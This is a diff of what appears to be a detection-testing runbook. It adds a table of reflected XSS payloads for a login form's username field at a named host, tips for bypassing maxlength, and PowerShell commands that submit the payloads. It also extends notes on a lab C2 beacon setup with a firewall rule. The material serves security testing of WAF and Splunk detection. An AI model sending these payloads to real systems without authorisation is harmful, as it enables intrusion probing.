@@ -34,13 +34,36 @@ Prints time + hostname + your IP — your marker for finding events in Splunk.
 
 # 1. WEB — XSS (UC0229)
 
+## 1a. Manual test — type these in the Username box (browser)
+The username reflects into the input's `value="..."`, with `maxlength="25"` (client-side
+only). Type a payload in the **Username** field, put anything in **Password**, click
+**Log in**, and watch for an alert popup or the payload rendering in the error area.
+
+| # | Payload (paste in Username) | Why it's shaped this way | Chars |
+|---|---|---|---|
+| 1 | `"><svg onload=alert(1)>` | **Best first try** — `">` escapes the double-quoted `value`, `<svg onload>` runs JS | 23 ✅ |
+| 2 | `'><svg onload=alert(1)>` | same, if the value uses **single** quotes | 23 ✅ |
+| 3 | `"><img src=x onerror=alert(1)>` | fallback if `svg` is filtered (remove maxlength first) | 29 |
+| 4 | `" onmouseover=alert(1) x="` | stays **inside** the attribute — fires when you hover the field | 25 ✅ |
+| 5 | `"autofocus onfocus=alert(1)>` | auto-fires on page load (no interaction) — remove maxlength | 27 |
+| 6 | `<svg onload=alert(1)>` | if it reflects as **plain text** (e.g. in the error message), not an attribute | 21 ✅ |
+| 7 | `"><script>alert(1)</script>` | classic (often blocked / won't run) — remove maxlength | 27 |
+
+> To use payloads longer than 25 chars: in DevTools, click the `txtUsername` input →
+> delete `maxlength="25"` → then paste the longer payload.
+
+**Result:** alert popup or the `<svg>`/`<img>` renders = reflected XSS (vuln). Plain
+text showing the characters = escaped (safe). WAF block page = detection caught it.
+
+## 1b. PowerShell test (sends it for you; bypasses maxlength; good for WAF detection)
+
 **Command 1 — marker test (find how input reflects)**
 ```powershell
 $r = Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName='xsstest123';password='x'} -UseBasicParsing; $r.Content | Select-String 'xsstest123'
 ```
 Submits a harmless marker and shows how it comes back (inside `value="..."`, `value='...'`, or plain text) — this decides which payload to use.
 
-**Command 2 — XSS payload (value breakout, fits maxlength 25)**
+**Command 2 — send the XSS payload**
 ```powershell
 Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName='"><svg onload=alert(1)>';password='x'} -UseBasicParsing
 ```
@@ -51,8 +74,6 @@ Sends `"><svg onload=alert(1)>` as the username — `">` breaks out of the value
 (Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName='"><svg onload=alert(1)>';password='x'} -UseBasicParsing).Content | Select-String 'svg onload=alert'
 ```
 If it returns your payload **unescaped**, the app is vulnerable; if it shows `&lt;svg...`, it's escaped (safe).
-
-> Manual browser version: type `"><svg onload=alert(1)>` in the Username box → Log in → alert popup = XSS.
 
 ---
 
@@ -134,13 +155,20 @@ index=* dest="hcms.aaagroup.com" src="<YOUR_IP>" earliest=-20m | table _time src
 You host a tiny HTTP "C2 server" on a **second Windows lab machine**, then beacon to
 it from the test box. Built-in PowerShell — no download.
 
+> **Why the firewall rule even though both are Windows on the same subnet?**
+> Windows Defender Firewall **blocks unsolicited inbound connections by default** —
+> this has nothing to do with the subnet. The beacon is an *inbound* connection to
+> port 8080 on the server, so without the rule the server's own firewall silently
+> drops it and no beacon arrives. Outbound (the beaconing machine) is allowed by
+> default, so **only the listening/server machine needs the rule.**
+
 ## On the C2 SERVER machine (the 2nd Windows box)
 
 **Command 1 — open the firewall for the listener port**
 ```powershell
 New-NetFirewallRule -DisplayName "TDA-C2" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
 ```
-Allows inbound traffic on port 8080 so the beacon can reach your server.
+Allows inbound traffic on port 8080 so the beacon can reach your server (Windows blocks it otherwise, same subnet or not).
 
 **Command 2 — start the HTTP listener (leave this window running)**
 ```powershell
